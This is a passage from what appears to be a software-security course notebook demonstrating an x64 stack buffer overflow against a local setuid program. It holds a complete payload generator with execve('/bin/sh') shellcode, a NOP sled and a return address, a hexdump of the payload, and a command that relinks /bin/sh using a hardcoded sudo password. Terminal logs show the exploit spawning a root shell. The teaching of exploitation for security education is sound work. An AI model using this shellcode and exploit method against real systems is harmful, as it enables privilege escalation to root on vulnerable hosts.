    "    str=0x7fffffffc5e0 \"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "    at stack.cpp:16\n",
    "16      }\n",
    "Registers contain pattern buffer:\n",
    "RBP+0 found at offset: 112\n",
    "Registers point to pattern buffer:\n",
    "[RSP] --> offset 120 - size ~86\n",
    "Pattern buffer found at:\n",
    "0x00417490 : offset    0 - size  500 ([heap])\n",
    "0x004184a0 : offset    0 - size  200 ([heap])\n",
    "0x00007ffff7fa6084 : offset 33208 - size    4 (/usr/lib/x86_64-linux-gnu/libm.so.6)\n",
    "0x00007fffffffc550 : offset    0 - size  200 ($sp + -0x78 [-30 dwords])\n",
    "0x00007fffffffc61c : offset   60 - size  140 ($sp + 0x54 [21 dwords])\n",
    "0x00007fffffffeaa0 : offset 31453 - size    4 ($sp + 0x24d8 [2358 dwords])\n",
    "References to pattern buffer found at:\n",
    "0x004172c8 : 0x00417490 ([heap])\n",
    "0x004172d0 : 0x00417490 ([heap])\n",
    "0x004172d8 : 0x00417490 ([heap])\n",
    "0x004172e0 : 0x00417490 ([heap])\n",
    "0x004172e8 : 0x00417490 ([heap])\n",
    "0x00007ffff7bf25c8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)\n",
    "0x00007ffff7bf25d0 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)\n",
    "0x00007ffff7bf25d8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)\n",
    "0x00007ffff7bf25e0 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)\n",
    "0x00007ffff7bf25e8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)\n",
    "0x00007ffff7bf25f0 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)\n",
    "0x00007ffff7bf25f8 : 0x004184a0 (/usr/lib/x86_64-linux-gnu/libc.so.6)\n",
    "0x00007fffffffc1e0 : 0x004184a0 ($sp + -0x3e8 [-250 dwords])\n",
    "0x00007fffffffc1f0 : 0x004184a0 ($sp + -0x3d8 [-246 dwords])\n",
    "0x00007fffffffc1f8 : 0x004184a0 ($sp + -0x3d0 [-244 dwords])\n",
    "0x00007fffffffc478 : 0x004184a0 ($sp + -0x150 [-84 dwords])\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "b63be74c",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#! /usr/bin/env python3\r\n",
      "\r\n",
      "import sys\r\n",
      "import argparse\r\n",
      "\r\n",
      "def main():\r\n",
      "\tparser = argparse.ArgumentParser(description=\"Generate Payload File.\")\r\n",
      "\tparser.add_argument(\"GDB_SHIFT\", help=\"Offset (int) the GDB shifting address to lower address...\")\r\n",
      "\r\n",
      "\t# Replace the content with the actual shellcode\r\n",
      "\t# 64-bit execve('/bin/sh') setuid shellcode\r\n",
      "\tSHELLCODE = (\r\n",
      "\t    b\"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\"\r\n",
      "\t    b\"\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\"\r\n",
      "\t    b\"\\x48\\x89\\xe6\\x48\\x31\\xc0\\xb0\\x3b\\x0f\\x05\"\r\n",
      "\t)\r\n",
      "\r\n",
      "\tOFFSET = 120  # 112 Offset to rbp + 8 bytes\r\n",
      "\tSHELLCODE_LEN = len(SHELLCODE)\r\n",
      "\tADD_LEN = 8  # Length of the address 4 bytes for 32-bit and 8 bytes for 64-bit\r\n",
      "\tNOP_LEN = OFFSET - SHELLCODE_LEN\r\n",
      "\t\r\n",
      "\targs = parser.parse_args()\r\n",
      "\t\r\n",
      "\tGDB_SHIFT_COMPENSATION = int(args.GDB_SHIFT) # stack is shigted higher in GDB due to its own environment variables, args, etc.\r\n",
      "\tRET_ADD = 0x7fffffffc550 + GDB_SHIFT_COMPENSATION  # FIXME: Change this address\r\n",
      "\r\n",
      "\t# Remove the 00 from the address\r\n",
      "\t# Note, 300 is added because the address shown in the gdb is different from\r\n",
      "\t# the actual address shown in the stack when the program is running.\r\n",
      "\t# This is because gdb pushes some values to the stack before running the program.\r\n",
      "\t# You can try different values to get the correct address if the attack is not successful.\r\n",
      "\t# Also, leading 00s not printed in gdb, but are automatically added by\r\n",
      "\t#  .to_bytes(ADD_LEN, byteorder='little') to make it 8 bytes long.\r\n",
      "\r\n",
      "\t#####################################################################\r\n",
      "\t# Build the payload\r\n",
      "\t# The content of the badfile is as follows:\r\n",
      "\tNOP_SLED = b'\\x90'*NOP_LEN\r\n",
      "\trepeated_add = (RET_ADD).to_bytes(ADD_LEN, byteorder='little')\r\n",
      "\tpayload = NOP_SLED + SHELLCODE + repeated_add\r\n",
      "\r\n",
      "\t# Write the payload to a binary file\r\n",
      "\tfile = 'badfile.bin'\r\n",
      "\twith open(file, 'wb') as f:\r\n",
      "\t    f.write(payload)\r\n",
      "\tprint(f'{file} payload file created.')\r\n",
      "\t\r\n",
      "\r\n",
      "\t#####################################################################\r\n",
      "\t\r\n",
      "if __name__ == \"__main__\":\r\n",
      "\tmain()\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "# Python script to generate the payload\n",
    "# make sure to FIX any FIXMEs to match your environment\n",
    "! cat generate_payload.py"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "3927156b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "badfile.bin payload file created.\r\n"
     ]
    }
   ],
   "source": [
    "! python generate_payload.py 315"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "fb76d486",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "128 badfile.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c badfile.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "8f155d82",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
      "00000050  90 90 90 90 90 90 90 90  90 90 48 31 d2 52 48 b8  |..........H1.RH.|\r\n",
      "00000060  2f 62 69 6e 2f 2f 73 68  50 48 89 e7 52 57 48 89  |/bin//shPH..RWH.|\r\n",
      "00000070  e6 48 31 c0 b0 3b 0f 05  8b c6 ff ff ff 7f 00 00  |.H1..;..........|\r\n",
      "00000080\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C badfile.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "19d2888e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "# create a /bin/sh symlink to /bin/zsh\n",
    "! echo kali | sudo -S ln -sf /bin/zsh /bin/sh"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "f79532ba",
   "metadata": {},
   "source": [
    "### Exploitation\n",
    "\n",
    "- create `badfile.bin` payload with different argument (315, 325, 335, etc.)\n",
    "- make sure the gdb compensation and the gdb buffer address doesn't add up to `00`\n",
    "- run `stack.exe badfile.bin` from the Terminal to exploit the program with the payload in `badfile.bin`\n",
    "- the program will execute the payload and spawn a shell as root\n",
    "- the return address in the payload is many need to be adjusted to land it in the NOP sled\n",
    "- you may need to do a bit of trial and error to get the correct address to land in the NOP sled\n",
    "- you can write a bash/Python script to automate the process"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "21df8104",
   "metadata": {},
   "source": [
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]\n",
    "└─$ python generate_payload.py 320\n",
    "badfile.bin payload file created.\n",
    "                                                                                                    \n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]\n",
    "└─$ ./stack.exe badfile.bin       \n",
    "������������������������������������������������������������������������������������������H1�RH�/bin//shPH��RWH��H1��;�����\n",
    "# whoami                                                                                           \n",
    "root\n",
    "# date                                                                                             \n",
    "Fri Apr  4 16:29:44 EDT 2025\n",
    "# exit \n",
    "\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]\n",
    "└─$ python generate_payload.py 325\n",
    "badfile.bin payload file created.\n",
    "                                                                                                    \n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]\n",
    "└─$ ./stack.exe badfile.bin       \n",
    "������������������������������������������������������������������������������������������H1�RH�/bin//shPH��RWH��H1��;�����\n",
    "# whoami                                                                                           \n",
    "root\n",
    "# date                                                                                             \n",
    "Fri Apr  4 16:30:34 EDT 2025\n",
    "# exit \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0402a21b",
   "metadata": {},
   "source": [
    "## Small Buffer Challenge\n",
    "\n",
    "- if the buffer is too small to fit the payload, you can't put the payload in the buffer before the return address\n",
    "- you can't put the payload after the return address because of the null bytes in the return address\n",
    "     - strcpy will stop copying when it encounters the null bytes\n",
    "- however, the payload is already loaded into main's stack frame\n",
    "- you can find the address of the payload in main's stack and use that address as the return address\n",
    "- this is left as an exercise for the reader"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "1407eff9",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
